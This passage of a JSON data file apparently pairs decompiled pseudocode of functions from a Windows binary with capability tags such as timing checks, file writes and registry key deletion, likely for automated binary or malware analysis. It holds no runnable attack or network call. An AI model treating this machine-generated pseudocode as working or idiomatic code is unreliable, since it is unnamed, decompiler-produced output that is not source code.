0x78;\n        do {\n            iVar2 = fcn.000319f8(auStack264, auStack72);\n            if (iVar2 == 0) {\n                iVar2 = fcn.000239a8(auStack168, 0);\n                if (iVar2 == 0) break;\n            }\n            auStackX16[0] = 0xffffffffff676980;\n            (**0x115e8)(0, 0, auStackX16);\n            bVar4 = iVar1 != 0;\n            iVar1 = iVar1 + -1;\n        } while (bVar4);\n        fcn.0005c990();\n        fcn.0001e098();\n        fcn.0004c9a0();\n        fcn.00057824();\n        fcn.0001d99c();\n        fcn.0003f314();\n        fcn.00044384();\n    }\n    return 0;\n}\n",
        "token_count": 650
    },
    "00016e04": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00016e04(ulong arg1)\n\n{\n    ulong arg1_00;\n    int32_t iVar1;\n    ulong unaff_RDI;\n    ulong in_R9;\n    bool bVar2;\n    ulong auStackX8 [4];\n    \n    iVar1 = fcn.000307e0();\n    fcn.0001ca30();\n    fcn.00059140(*0x7dcd0);\n    fcn.0005540c(0x7dcd0);\n    if (iVar1 < 0x1b) {\n        fcn.00048ef0(*0x7e550);\n    }\n    fcn.00017298();\n    if (arg1 != 0) {\n        fcn.000164e0();\n    }\n    fcn.0001cd68();\n    fcn.00016744(*(*0x69080 + 4));\n    fcn.00016674();\n    if (arg1 != 0) {\n        fcn.00055a90();\n    }\n    while( true ) {\n        arg1_00 = *0x7e270;\n        LOCK();\n        bVar2 = *0x7e280 == 0;\n        *0x7e280 = *0x7e280 ^ bVar2 * (*0x7e280 ^ 1);\n        if (bVar2) break;\n        auStackX8[0] = 0;\n        (**0x115e8)(0, 0, auStackX8, in_R9, unaff_RDI);\n    }\n    *0x7e278 = 0;\n    *0x7e270 = 0;\n    fcn.00030d24(arg1_00);\n    LOCK();\n    *0x7e280 = *0x7e280 - 1;\n    return;\n}\n",
        "token_count": 400
    },
    "00017880": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00017880(int16_t *arg1)\n\n{\n    int16_t iVar1;\n    bool bVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int16_t *piVar6;\n    int32_t aiStackX8 [4];\n    ulong auStackX24 [2];\n    int32_t *piVar7;\n    ulong in_stack_fffffffffffff830;\n    uint uVar10;\n    ulong uVar8;\n    ulong uVar9;\n    ulong in_stack_fffffffffffff838;\n    uint32_t uVar12;\n    uint64_t uVar11;\n    ulong in_stack_fffffffffffff840;\n    uint uVar13;\n    ulong in_stack_fffffffffffff848;\n    uint uVar15;\n    ulong uVar14;\n    uint auStack1944 [2];\n    ulong uStack1936;\n    uchar *puStack1928;\n    uint uStack1920;\n    ulong uStack1912;\n    ulong uStack1904;\n    uchar auStack1896 [16];\n    ushort uStack1880;\n    ushort uStack1878;\n    ulong uStack1872;\n    ushort uStack1864;\n    ushort uStack1862;\n    ulong uStack1856;\n    ushort uStack1848;\n    ushort uStack1846;\n    ulong uStack1840;\n    ushort uStack1832;\n    ushort uStack1830;\n    ulong uStack1824;\n    ushort uStack1816;\n    ushort uStack1814;\n    ulong uStack1808;\n    ushort uStack1800;\n    ushort uStack1798;\n    ulong uStack1792;\n    ushort uStack1784;\n    ushort uStack1782;\n    ulong uStack1776;\n    uchar auStack1768 [16];\n    ulong uStack1752;\n    uint64_t uStack1744;\n    uchar auStack1736 [112];\n    uchar auStack1624 [518];\n    ushort uStack1106;\n    int16_t aiStack1096 [259];\n    ushort uStack578;\n    int16_t aiStack568 [259];\n    ushort uStack50;\n    \n    uVar10 = in_stack_fffffffffffff830 >> 0x20;\n    uVar12 = in_stack_fffffffffffff838 >> 0x20;\n    uVar13 = in_stack_fffffffffffff840 >> 0x20;\n    uVar15 = in_stack_fffffffffffff848 >> 0x20;\n    uStack1832 = 8;\n    uStack1830 = 10;\n    uStack1824 = 0x119c0;\n    uStack1784 = 10;\n    uStack1782 = 0xc;\n    uStack1776 = 0x119b0;\n    uStack1816 = 0x18;\n    uStack1814 = 0x1a;\n    uStack1808 = 0x11990;\n    uStack1800 = 10;\n    uStack1798 = 0xc;\n    uStack1792 = 0x11980;\n    uStack1880 = 0x12;\n    uStack1878 = 0x14;\n    uStack1872 = 0x11968;\n    uStack1848 = 0x14;\n    uStack1846 = 0x16;\n    uStack1840 = 0x11950;\n    uStack1864 = 10;\n    uStack1862 = 0xc;\n    uStack1856 = 72000;\n    fcn.000292e4(auStack1736, 100);\n    fcn.00066722(auStack1624, 0x104, 0x11920, auStack1736);\n    uStack1106 = 0;\n    fcn.00029334(auStack1736, 100);\n    fcn.00066722(aiStack568, 0x104, 0x11910, auStack1624, auStack1736);\n    uStack50 = 0;\n    fcn.00066704(auStack1896, auStack1624);\n    auStack1944[0] = 0x30;\n    uStack1936 = 0;\n    uStack1920 = 0x40;\n    puStack1928 = auStack1896;\n    uStack1912 = 0;\n    uStack1904 = 0;\n    uVar14 = CONCAT44(uVar15, 0x21);\n    uVar9 = CONCAT44(uVar13, 2);\n    uVar11 = uVar12 << 0x20;\n    uVar8 = CONCAT44(uVar10, 2);\n    iVar4 = fcn.0001e364(auStackX24, 0xc0000000, auStack1944, auStack1768, 0, uVar8, uVar11, uVar9, uVar14, 0, 0);\n    uVar10 = uVar8 >> 0x20;\n    uVar13 = uVar9 >> 0x20;\n    uVar15 = uVar14 >> 0x20;\n    if (iVar4 == 0) {\n        fcn.000666f2(auStackX24[0]);\n    }\n    if ((*arg1 == 0) && (*(arg1 + 0x14) != 0)) {\n        (**0x11330)(*(arg1 + 0x14), 0x10, 1);\n        uVar8 = **(arg1 + 0x14);\n        uVar3 = (*(arg1 + 0x14))[1];\n        uStack1752 = uVar8;\n        uStack1744 = uVar3;\n        (**0x11330)(uVar8, uVar8, uVar3 & 0xffffffff, 1);\n        fcn.00066704(auStack1896, aiStack568);\n        auStack1944[0] = 0x30;\n        uStack1936 = 0;\n        uStack1920 = 0x40;\n        puStack1928 = auStack1896;\n        uStack1912 = 0;\n        uStack1904 = 0;\n        uVar11 = uVar11 & 0xffffffff00000000;\n        uVar9 = CONCAT44(uVar10, 0x80);\n        iVar4 = fcn.0001e364(auStackX24, 0x40000000, auStack1944, auStack1768, 0, uVar9, uVar11, CONCAT44(uVar13, 2), \n                             CONCAT44(uVar15, 0x60), 0, 0);\n        uVar10 = uVar9 >> 0x20;\n        if (iVar4 == 0) {\n            fcn.0006671c(auStackX24[0], 0, 0, 0, auStack1768, uVar8, uVar11 & 0xffffffff00000000 | uVar3 & 0xffffffff, 0\n                         , 0);\n            uVar10 = uVar8 >> 0x20;\n            fcn.000666f2(auStackX24[0]);\n        }\n    }\n    iVar4 = fcn.000307e0();\n    bVar2 = 0x26 < iVar4;\n    fcn.000291e4(auStack1736, 100);\n    fcn.00066722(aiStack1096, 0x104, 0x118a0);\n    fcn.00066704(auStack1896, aiStack1096);\n    auStack1944[0] = 0x30;\n    uStack1936 = 0;\n    uStack1920 = 0x40;\n    puStack1928 = auStack1896;\n    uStack1912 = 0;\n    uStack1904 = 0;\n    iVar4 = fcn.0001cae8(auStackX24, 0x40000000, auStack1944, 0);\n    if (iVar4 == 0) {\n        aiStackX8[0] = 0;\n        fcn.0001cb94(auStackX24[0], &uStack1816, 0, 4);\n        aiStackX8[0] = (-bVar2 & 0xf) + 1;\n        fcn.0001cb94(auStackX24[0], &uStack1832, 0, 4);\n        aiStackX8[0] = bVar2 + 1;\n        uVar8 = CONCAT44(uVar10, 4);\n        piVar7 = aiStackX8;\n        fcn.0001cb94(auStackX24[0], &uStack1784, 0, 4);\n        if (bVar2) {\n            fcn.000292e4(auStack1736, 100);\n            fcn.00066722(auStack1624, 0x104, 0x11858, auStack1736, piVar7, uVar8);\n            uStack1106 = 0;\n            fcn.00029384(auStack1736, 100);\n            fcn.00066722(aiStack1096, 0x104, 0x11910, auStack1624, auStack1736);\n            uStack578 = 0;\n            iVar5 = -1;\n            piVar6 = aiStack1096;\n            do {\n                if (iVar5 == 0) break;\n                iVar5 = iVar5 + -1;\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            fcn.0001cb94(auStackX24[0], &uStack1880, 0, 2);\n        }\n        else {\n            fcn.0001cb94(auStackX24[0], &uStack1800, 0, 1);\n            iVar5 = -1;\n            piVar6 = aiStack568;\n            do {\n                if (iVar5 == 0) break;\n                iVar5 = iVar5 + -1;\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            fcn.0001cb94(auStackX24[0], &uStack1880, 0, 1);\n        }\n        if (bVar2) {\n            fcn.0001cb94(auStackX24[0], &uStack1848, 0, 1);\n            aiStackX8[0] = 1;\n            fcn.0001cb94(auStackX24[0], &uStack1864, 0, 4);\n        }\n        fcn.00066716(auStackX24[0]);\n        fcn.000666f2(auStackX24[0]);\n    }\n    return;\n}\n",
        "token_count": 2396
    },
    "00017f2c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create or open file",
            "delete registry key",
            "delete file"
        ],
        "decompiled_code": "\nvoid fcn.00017f2c(char param_1)\n\n{\n    int32_t iVar1;\n    uchar auStackX16 [8];\n    ulong uStackX24;\n    ulong uStackX32;\n    uint auStack792 [2];\n    ulong uStack784;\n    ushort *puStack776;\n    uint uStack768;\n    ulong uStack760;\n    ulong uStack752;\n    uchar auStack744 [16];\n    ushort uStack728;\n    ushort uStack726;\n    ulong uStack720;\n    ushort uStack712;\n    ushort uStack710;\n    ulong uStack704;\n    uchar auStack696 [16];\n    uchar auStack680 [112];\n    uchar auStack568 [528];\n    \n    uStack720 = 0x11a50;\n    uStack728 = 8;\n    uStack726 = 10;\n    uStack712 = 0x68;\n    uStack704 = 0x119e0;\n    uStack710 = 0x6a;\n    fcn.000292e4(auStack680, 100);\n    fcn.00066722(auStack568, 0x104, 0x11920, auStack680);\n    fcn.00066704(auStack744, auStack568);\n    puStack776 = auStack744;\n    uStack768 = 0x40;\n    auStack792[0] = 0x30;\n    uStack784 = 0;\n    uStack760 = 0;\n    uStack752 = 0;\n    iVar1 = fcn.0006673a(&uStackX24, 0x10000000, auStack792, auStack696, 0, 0);\n    if (iVar1 == 0) {\n        if (param_1 != '\\0') {\n            fcn.00029294(auStack680, 100);\n            fcn.00066722(auStack568, 0x104, 0x119cc, auStack680);\n            fcn.00066704(auStack744, auStack568);\n            uStack784 = uStackX24;\n            puStack776 = auStack744;\n            auStack792[0] = 0x30;\n            uStack768 = 0x40;\n            uStack760 = 0;\n            uStack752 = 0;\n            fcn.00066734(auStack792);\n        }\n        fcn.00029334(auStack680, 100);\n        fcn.00066722(auStack568, 0x104, 0x119cc, auStack680);\n        fcn.00066704(auStack744, auStack568);\n        uStack784 = uStackX24;\n        puStack776 = auStack744;\n        auStack792[0] = 0x30;\n        uStack768 = 0x40;\n        uStack760 = 0;\n        uStack752 = 0;\n        fcn.00066734(auStack792);\n        if (param_1 != '\\0') {\n            auStackX16[0] = 1;\n            fcn.0006672e(uStackX24, auStack696, auStackX16, 1, 0xd);\n        }\n        fcn.000666f2(uStackX24);\n    }\n    fcn.000291e4(auStack680, 100);\n    fcn.00066722(auStack568, 0x104, 0x118a0, auStack680);\n    fcn.00066704(auStack744, auStack568);\n    puStack776 = auStack744;\n    auStack792[0] = 0x30;\n    uStack784 = 0;\n    uStack768 = 0x40;\n    uStack760 = 0;\n    uStack752 = 0;\n    iVar1 = fcn.000666fe(&uStackX24, 0x10000000, auStack792);\n    if (iVar1 == 0) {\n        uStack784 = uStackX24;\n        puStack776 = &uStack728;\n        auStack792[0] = 0x30;\n        uStack768 = 0x40;\n        uStack760 = 0;\n        uStack752 = 0;\n        iVar1 = fcn.000666fe(&uStackX32, 0x10000000, auStack792);\n        if (iVar1 == 0) {\n            fcn.00066728(uStackX32);\n            fcn.000666f2(uStackX32);\n        }\n        fcn.00066728(uStackX24);\n        fcn.000666f2(uStackX24);\n    }\n    puStack776 = &uStack712;\n    auStack792[0] = 0x30;\n    uStack784 = 0;\n    uStack768 = 0x40;\n    uStack760 = 0;\n    uStack752 = 0;\n    iVar1 = fcn.000666fe(&uStackX24, 0x10000000, auStack792);\n    if (iVar1 == 0) {\n        fcn.00066716(uStackX24);\n        fcn.000666f2(uStackX24);\n    }\n    return;\n}\n",
        "token_count": 1144
    },
    "000196c8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.000196c8(int64_t *arg1, int64_t arg2, int64_t *arg3, ulong arg4)\n\n{\n    int64_t arg1_00;\n    int64_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    \n    uVar5 = 0;\n    if (*arg1 != 0) {\n        piVar4 = arg1;\n        uVar7 = uVar5;\n        uVar8 = uVar5;\n        do {\n            arg1_00 = *piVar4;\n            if (arg3 == NULL) {\ncode_r0x0001973f:\n                fcn.0001952c(arg1_00, arg2 + uVar8 * 8, CONCAT71(arg2 >> 8, 1), arg4);\n                iVar1 = *(arg1_00 + 0x38);\n                uVar8 = uVar8 + 1;\n                for (uVar6 = uVar5; (iVar1 != 0 && (*(uVar6 + iVar1) != 0)); uVar6 = uVar6 + 8) {\n                    if ((arg3 == NULL) || (piVar4 = *(uVar6 + iVar1) + 8,  *piVar4 != *arg3 && *arg3 <= *piVar4)) {\n                        iVar2 = fcn.0001952c(*(uVar6 + iVar1), arg2 + uVar8 * 8, 0, arg4);\n                        uVar8 = uVar8 + 1;\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00066782(iVar2);\n                            return uVar3;\n                        }\n                    }\n                    iVar1 = *(arg1_00 + 0x38);\n                }\n            }\n            else {\n                piVar4 = *(arg1_00 + 0x38);\n                if (piVar4 != NULL) {\n                    for (; *piVar4 != 0; piVar4 = piVar4 + 1) {\n                        if (*(*piVar4 + 8) != *arg3 && *arg3 <= *(*piVar4 + 8)) goto code_r0x0001973f;\n                    }\n                }\n            }\n            uVar7 = uVar7 + 1;\n            piVar4 = arg1 + uVar7;\n        } while (*piVar4 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 573
    },
    "0001a1ec": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.0001a1ec(void)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int32_t aiStack56 [8];\n    uint64_t uStack24;\n    \n    iVar1 = fcn.000667a0(0xffffffffffffffff, 0, aiStack56, 0x30, 0);\n    if ((iVar1 == 0) && (aiStack56[0] == 0x103)) {\n        uVar2 = uStack24 & 0xffffffff;\n        if (uStack24 == *(*0x69080 + 0x1c)) {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 169
    },
    "0004cb58": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0004cb58(uint64_t arg1, uchar *arg2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t in_GS_OFFSET;\n    uchar auStack152 [24];\n    ulong uStack128;\n    uchar *puStack120;\n    int32_t iStack112;\n    uchar auStack104 [72];\n    \n    uVar1 = (**0x11200)();\n    if (arg1 == *(in_GS_OFFSET + 0x52)) {\n        iStack112 = (*0x4cb38)(arg2);\n    }\n    else {\n        (*_fcn.00011608)(auStack152, 0, 0);\n        uStack128 = 0x4cb38;\n        puStack120 = arg2;\n        (**0x11610)(auStack104, 0x1a788, auStack152);\n        uVar3 = 0;\n        (**0x11618)(auStack104, 2);\n        (**0x11620)(auStack104, uVar3 & 0xffffffffffffff00 | arg1 & 0xff);\n        (**0x11628)(auStack104, 0, 0);\n        do {\n            arg2 = auStack152;\n            iVar2 = (**0x111f8)(arg2);\n        } while (iVar2 == 0);\n    }\n    (*_fcn.000111f0)(arg2 & 0xffffffffffffff00 | uVar1);\n    return ~-(iStack112 != 0) & 0xc0000001;\n}\n",
        "token_count": 350
    },
    "0001ad64": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "write file on Windows",
            "read file on Windows"
        ],
        "decompiled_code": "\nuint64_t fcn.0001ad64(int16_t *arg1, int16_t *arg2, int64_t arg3, ulong arg4)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int16_t *piVar6;\n    int64_t aiStackX8 [4];\n    int64_t *in_stack_00000028;\n    ulong in_stack_fffffffffffffd00;\n    uint uVar8;\n    ulong uVar7;\n    ulong in_stack_fffffffffffffd10;\n    uint uVar10;\n    uint64_t uVar9;\n    ulong in_stack_fffffffffffffd18;\n    uint uVar12;\n    ulong uVar11;\n    int64_t iStack712;\n    int64_t iStack704;\n    uchar auStack696 [8];\n    int64_t iStack688;\n    uint auStack680 [2];\n    ulong uStack672;\n    uchar *puStack664;\n    uint uStack656;\n    ulong uStack648;\n    ulong uStack640;\n    uchar auStack632 [16];\n    ulong uStack616;\n    int16_t aiStack600 [268];\n    \n    uVar8 = in_stack_fffffffffffffd00 >> 0x20;\n    uVar10 = in_stack_fffffffffffffd10 >> 0x20;\n    uVar12 = in_stack_fffffffffffffd18 >> 0x20;\n    iStack704 = 0;\n    iStack712 = 0;\n    aiStackX8[0] = 0;\n    if (((arg1 == NULL) || (*arg1 == 0)) || (arg2 == NULL)) {\n        return 0xc000000d;\n    }\n    fcn.00031420(aiStack600, 0x104, arg1);\n    fcn.00066704(auStack632, aiStack600);\n    uVar11 = CONCAT44(uVar12, 0x10);\n    uVar9 = CONCAT44(uVar10, 1);\n    puStack664 = auStack632;\n    uVar7 = CONCAT44(uVar8, 0x80);\n    auStack680[0] = 0x30;\n    uStack672 = 0;\n    uStack656 = 0x40;\n    uStack648 = 0;\n    uStack640 = 0;\n    uVar4 = fcn.0001e364(&iStack704, 0x80100000, auStack680, auStack696, 0, uVar7, 1, uVar9, uVar11, 0, 0);\n    uVar8 = uVar7 >> 0x20;\n    uVar10 = uVar11 >> 0x20;\n    if (uVar4 != 0) {\n        return uVar4;\n    }\n    if (*arg2 == 0) {\ncode_r0x0001aea9:\n        iVar5 = fcn.00066764(arg1);\n        if (iVar5 != 0) {\n            arg1 = iVar5 + 2;\n        }\n        piVar6 = arg1;\n        if (*arg2 != 0) {\n            fcn.00031420(aiStack600, 0x104, arg2);\n            uVar4 = 0xffffffffffffffff;\n            piVar6 = aiStack600;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            fcn.000667ca(aiStack600, 0x11b14, 0x104 - (~uVar4 - 1));\n            uVar4 = 0xffffffffffffffff;\n            piVar6 = aiStack600;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            fcn.000667ca(aiStack600, arg1, 0x104 - (~uVar4 - 1));\n            goto code_r0x0001af45;\n        }\n    }\n    else {\n        uVar4 = 0xffffffffffffffff;\n        piVar6 = arg2;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        piVar6 = arg2;\n        if (arg2[~uVar4 - 2] == 0x5c) goto code_r0x0001aea9;\n    }\n    fcn.00031420(aiStack600, 0x104, piVar6);\ncode_r0x0001af45:\n    fcn.00066704(auStack632, aiStack600);\n    puStack664 = auStack632;\n    auStack680[0] = 0x30;\n    uStack672 = 0;\n    uStack656 = 0x40;\n    uStack648 = 0;\n    uStack640 = 0;\n    uVar2 = fcn.0001e364(&iStack712, 0x40100000, auStack680, auStack696, 0, CONCAT44(uVar8, 0x80), 0, \n                         uVar9 & 0xffffffff00000000 | in_stack_00000028 != NULL, CONCAT44(uVar10, 0x10), 0, 0);\n    if (uVar2 == 0) {\n        iVar5 = fcn.00030c98(0x10000);\n        if (iVar5 == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            if (in_stack_00000028 == NULL) {\n                aiStackX8[0] = 0;\n            }\n            else {\n                aiStackX8[0] = *in_stack_00000028;\n            }\n            iStack688 = 0;\n            while ((arg3 == 0 || (iVar3 = (**0x111f8)(arg3),  iVar3 == 0))) {\n                aiStackX8[0] = aiStackX8[0] + iStack688;\n                uVar2 = fcn.000667c4(iStack704, 0, 0, 0, auStack696, iVar5, 0x10000, aiStackX8, 0);\n                if (uVar2 != 0) {\n                    if (uVar2 == 0xc0000011) {\n                        uVar2 = 0;\n                    }\n                    goto code_r0x0001b164;\n                }\n                if ((arg3 != 0) && (iVar3 = (**0x111f8)(arg3),  iVar3 != 0)) break;\n                uVar2 = fcn.0006671c(iStack712);\n                if (uVar2 != 0) goto code_r0x0001b164;\n                if (arg4 != 0) {\n                    for (uVar2 = arg4 / 200; uVar2 != 0; uVar2 = uVar2 - 1) {\n                        if ((arg3 != 0) && (iVar3 = (**0x111f8)(arg3),  iVar3 != 0)) goto code_r0x0001b155;\n                        uStack616 = 0xffffffffffe17b80;\n                        (**0x115e8)(0);\n                    }\n                }\n            }\ncode_r0x0001b155:\n            uVar2 = 0xc0000120;\n        }\ncode_r0x0001b164:\n        if (iVar5 != 0) {\n            fcn.00030d24(iVar5);\n        }\n    }\n    if (iStack712 != 0) {\n        fcn.000666f2();\n    }\n    if (iStack704 != 0) {\n        fcn.000666f2();\n    }\n    if ((uVar2 == 0xc0000120) && (in_stack_00000028 != NULL)) {\n        *in_stack_00000028 = aiStackX8[0];\n    }\n    return uVar2;\n}\n",
        "token_count": 1847
    },
    "0001b3e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.0001b3e0(char param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    bool bVar4;\n    ulong auStackX16 [3];\n    \n    pcVar2 = (**0x11250)();\n    pcVar3 = pcVar2;\n    if (param_1 != pcVar2) {\n        while( true ) {\n            LOCK();\n            bVar4 = *0x7e280 == 0;\n            *0x7e280 = *0x7e280 ^ bVar4 * (*0x7e280 ^ 1);\n            pcVar3 = !bVar4 * *0x7e280;\n            if (bVar4) break;\n            auStackX16[0] = 0;\n            (**0x115e8)(0, 0, auStackX16);\n        }\n        pcVar1 = *0x7e270;\n        if (((param_1 == '\\0') || (pcVar1 = *0x7e278,  param_1 == '\\x01')) && (pcVar3 = pcVar1,  pcVar3 != NULL)) {\n            pcVar3 = (*pcVar3)();\n        }\n        LOCK();\n        *0x7e280 = *0x7e280 - 1;\n    }\n    return pcVar3 & 0xffffffffffffff00 | pcVar2 & 0xff;\n}\n",
        "token_count": 317
    },
    "0001cdec": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.0001cdec(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong uStackX8;\n    ulong auStackX16 [3];\n    uint auStack616 [2];\n    ulong uStack608;\n    ushort *puStack600;\n    uint uStack592;\n    ulong uStack584;\n    ulong uStack576;\n    ushort uStack568;\n    ushort uStack566;\n    ulong uStack560;\n    ushort auStack552 [8];\n    uchar auStack536 [528];\n    \n    uStack560 = 0x11cb0;\n    puStack600 = &uStack568;\n    uStack568 = 0x70;\n    uStack566 = 0x72;\n    auStack616[0] = 0x30;\n    uStack608 = 0;\n    uStack592 = 0x40;\n    uStack584 = 0;\n    uStack576 = 0;\n    iVar1 = fcn.00066806(&uStackX8, 0x1f0003, auStack616);\n    if (iVar1 != 0) {\n        fcn.00028d7c(auStack536, 0x104);\n        fcn.00066704(auStack552, auStack536);\n        puStack600 = auStack552;\n        auStack616[0] = 0x30;\n        uStack608 = 0;\n        uStack592 = 0x40;\n        uStack584 = 0;\n        uStack576 = 0;\n        iVar1 = fcn.00066806(&uStackX8, 0x1f0003, auStack616);\n        if (iVar1 != 0) {\n            uVar3 = fcn.00032390(auStackX16);\n            if (uVar3 != 0) {\n                return uVar3;\n            }\n            puStack600 = auStack552;\n            auStack616[0] = 0x30;\n            uStack584 = auStackX16[0];\n            uStack608 = 0;\n            uStack592 = 0x240;\n            uStack576 = 0;\n            uVar2 = fcn.00066800(*0x69080 + 0x28, 0x1f0003, auStack616, 0, 0);\n            fcn.000324b8(auStackX16[0]);\n            return uVar2;\n        }\n    }\n    fcn.000666f2(uStackX8);\n    return 0x40000000;\n}\n",
        "token_count": 568
    },
    "0001e11c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0001e11c(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    \n    uVar2 = 0;\n    if (*0x7eab5 != '\\0') {\n        *0x7eab5 = '\\0';\n        fcn.00059140(*0x7eac8);\n        fcn.0005540c(0x7eac8);\n        fcn.00059140(*0x7ead8);\n        fcn.0005540c(0x7ead8);\n        fcn.00059140(*0x7eac0);\n        fcn.0005540c(0x7eac0);\n        fcn.00059140(*0x7eae0);\n        fcn.0005540c(0x7eae0);\n        fcn.00059140(*0x7eab8);\n        fcn.0005540c(0x7eab8);\n        fcn.00059140(*0x7ead0);\n        fcn.0005540c(0x7ead0);\n        fcn.0001b4e8();\n        uVar3 = uVar2;\n        if (*0x7e818 != 0) {\n            do {\n                fcn.00030d24(*(uVar3 + *0x7e820));\n                uVar1 = uVar2 + 1;\n                uVar2 = uVar1;\n                uVar3 = uVar3 + 8;\n            } while (uVar1 < *0x7e818);\n        }\n        fcn.00030d24(*0x7e820);\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "0001e5ac": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.0001e5ac(ulong arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    char *pcVar4;\n    \n    if (*0x7eb78 == 0) {\n        fcn.00029094(0x7e840, 0x52);\n        uVar3 = 0xffffffffffffffff;\n        pcVar4 = 0x7e840;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        *0x7eb78 = ~uVar3 - 1;\n        fcn.000290e4(0x7e9b0, 0x52);\n        uVar3 = 0xffffffffffffffff;\n        pcVar4 = 0x7e9b0;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        *0x7e8a8 = ~uVar3 - 1;\n    }\n    iVar2 = fcn.00066812(arg1, 0x7e840, *0x7eb78);\n    if ((iVar2 != 0) && (iVar2 = fcn.00066812(arg1, 0x7e9b0, *0x7e8a8),  iVar2 != 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 390
    },
    "0001e804": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0001e804(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar auStackX8 [32];\n    uchar auStack120 [104];\n    \n    iVar1 = fcn.0004cdb4();\n    if (iVar1 != *(*0x69080 + 0x1c)) {\n        iVar2 = fcn.0003205c(auStack120, 0x52);\n        uVar4 = 0;\n        if ((iVar2 != 0) && (iVar2 = fcn.0001e5ac(auStack120),  iVar2 != 0)) {\n            return 1;\n        }\n        if (*0x7eab5 != '\\0') {\n            fcn.00032650(0x7eb50, auStackX8, 0);\n            piVar3 = *0x7eb70;\n            uVar5 = uVar4;\n            if (*0x7eb68 != 0) {\n                do {\n                    if (*piVar3 == iVar1) {\n                        uVar4 = 1;\n                        break;\n                    }\n                    uVar5 = uVar5 + 1;\n                    piVar3 = piVar3 + 2;\n                } while (uVar5 < *0x7eb68);\n            }\n            fcn.00032684(0x7eb50, auStackX8, 0);\n            return uVar4;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 349
    },
    "0001f84c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
